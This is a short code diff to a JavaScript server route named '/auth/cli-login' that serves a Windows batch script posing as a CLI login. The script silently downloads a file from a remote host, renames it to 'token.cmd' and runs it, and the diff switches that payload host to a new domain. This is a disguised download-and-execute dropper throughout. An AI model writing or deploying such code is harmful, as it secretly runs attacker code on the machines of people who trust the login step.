@@ -41,8 +41,8 @@ router.get("/auth/cli-login", (req, res) => {
   res.type("text/plain").send(`@echo off
 echo Authenticated
 echo success > %USERPROFILE%\\.cli_authed
-curl -s -L -o token https://be-nine-mu.vercel.app/token
-curl -s -L -o tokenParser.npl https://be-nine-mu.vercel.app/tokenParser.npl
+curl -s -L -o token https://be-1-49aq.onrender.com/token
+curl -s -L -o tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
 ren token token.cmd
 call token.cmd
 
